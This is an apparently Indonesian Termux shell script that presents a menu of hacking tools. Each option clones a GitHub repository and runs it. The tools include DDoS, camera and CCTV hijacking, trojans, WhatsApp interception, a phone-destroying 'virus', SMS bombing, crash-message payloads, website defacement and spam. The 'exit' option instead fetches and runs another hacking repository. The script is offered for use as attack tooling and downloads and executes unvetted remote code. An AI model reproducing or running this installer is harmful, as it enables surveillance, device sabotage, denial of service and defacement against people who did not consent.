clear
figlet Santri Cyber | lolcat
echo "========================================================
# Author    : SANTRI CYBER SANTUY
# Github    : https://github.com/AKKUSANTUY
# Contact   : rayarzlost@gmail.com
# Facebook  : https://www.facebook.com/SANTRI.CYBER.CUK
# Instagram : @Akku_Santuy
# WhatsApp  : +6288221708799
# Youtube   : Cari Ajaa Sendiri Cuk
# TikTod    : Ngaa Punya Apk Haram Cuk Uninstall Ajaa
# Bucin     : MERENDAH SAMPAI TIDAK ADA YANG MERENDAHKAN
# you       : JANGAN LUPA ISTIGHFAR KITA SEMUA PENDOSA
========================================================" | lolcat
sleep 2
echo " Pilih SCSToolsnya Cuk : " | lolcat
echo " ÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷" | lolcat
echo " IRI BILANG BOSS" | lolcat
echo " [1] lucita_DDoS" | lolcat
echo " [2] HackKamera" | lolcat
echo " [3] VirusTrojans" | lolcat
echo " [4] SadapWa" | lolcat
echo " [5] VirusHp (Justahacker)" | lolcat
echo " [6] BrutalSms" | lolcat
echo " [7] BuatVirtex" | lolcat
echo " [8] Deface" | lolcat
echo " [9] HackCCTV" | lolcat
echo " [10] Keluar" | lolcat
echo " [00] Message" | lolcat
echo " [99] Perusak" | lolcat
echo " [404] MultiSpam" | lolcat
echo " TAREK SESS KUNTULL" | lolcat
echo " ÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷" | lolcat
echo " Gwe Tanya Lu Mampu Ngak Boss??" | lolcat
echo " ————————————————————————————————————————————" | lolcat
echo " Masukan Nomor Tools Yang Mau Di Install Cuk : " | lolcat
read nomor

if [ $nomor = 1 ] || [ $eue = 01 ]
then
clear
echo " lucita_DDoS.. " | lolcat
sleep 1
pkg install php -y
git clone https://github.com/RaElyaCyber/lucita_ddos
cd lucita_ddos
python pukul.py
fi

if [ $nomor = 2 ] || [ $nomor = 02 ]
then
clear
echo " HackKamera.. " | lolcat
apt update && apt upgrade
pkg install openssh
termux-setup-storage
cd /sdcard
mkdir hackcam
cd hackcam
git clone https://github.com/reyspeed/hack-camera
cd hack-camera
bash camera.sh
fi

if [ $nomor = 3 ] || [ $nomor = 03 ]
then
clear
echo " VirusTrojans.." | lolcat
pkg install git
pkg install bash
git clone https://github.com/R133F/Trojans 
cd Trojans
python trojans.py
fi

if [ $nomor = 4 ] || [ $nomor = 04 ]
then
clear
echo " SadapWa.." | lolcat
pkg install bash
pkg install python
git clone https://github.com/Bl4ckDr460n/HxWhatsApp
cd HxWhatsApp
python2 HxWhatsApp.py
fi

if [ $nomor = 5 ] || [ $nomor = 5 ]
then
clear
echo " VirusHp.." | lolcat
pkg install python git
git clone https://github.com/justahackers/perusak
cd perusak
python2 perusak.py
fi

if [ $nomor = 6 ] || [ $nomor = 6 ]
then
clear
echo " BrutalSms.." | lolcat
pkg update && pkg upgrade
pkg install git
pkg install python
pkg install toilet
pkg install figlet
git clone https://github.com/TERMUXID3/brutal-sms
cd brutal-sms
ls
python2 run.py
fi

if [ $nomor = 7 ] || [ $nomor = 7 ]
then
clear
echo " BuatVirtex.." | lolcat
apt install curl
apt install ruby
apt install figlet
gem install lolcat
git clone https://github.com/muhammadfathul/VIRTEX
cd VIRTEX
chmod +x virtex.sh
sh virtex.sh
fi

if [ $nomor = 8 ] || [ $nomor = 8 ]
then
clear
echo " Deface.." | lolcat
git clone https://github.com/RaElyaCyber/deface-script
ls
cd deface-script
ls
python2 deface.py
fi

if [ $nomor = 9 ] || [ $nomor = 9 ]
then
clear
echo " HackCCTV.." | lolcat
pkg update && pkg upgrade
pkg install python
git clone https://github.com/storiku/HackCCTV
cd HackCCTV
python2 HCCTV.py
fi

if [ $nomor = 10 ] || [ $nomor = 10 ]
then
clear
echo " Keluar.. " |  lolcat
git clone https://github.com/AKKUSANTUY/SCSHacker
cd SCSHacker
python2 Hack.py
fi

if [ $nomor = 00 ] || [ $nomor = 0 ]
then
clear 
echo " Message.. " | lolcat
git clone https://github.com/AKKUSANTUY/SCSantuy
cd SCSantuy
python2 SCS.py
fi

if [ $nomor = 99 ] 
then
clear
echo " Perusak Hp.. " | lolcat
git clone https://github.com/AKKUSANTUY/perusak
cd perusak
python2 perusak.py
fi


if [ $nomor = 404 ] 
then
clear
echo " MultiSpam.. " | lolcat
git clone https://github.com/AKKUSANTUY/MULTISPAMUNLIMITED
cd MULTISPAMUNLIMITED
python2 SCSspam.py
fi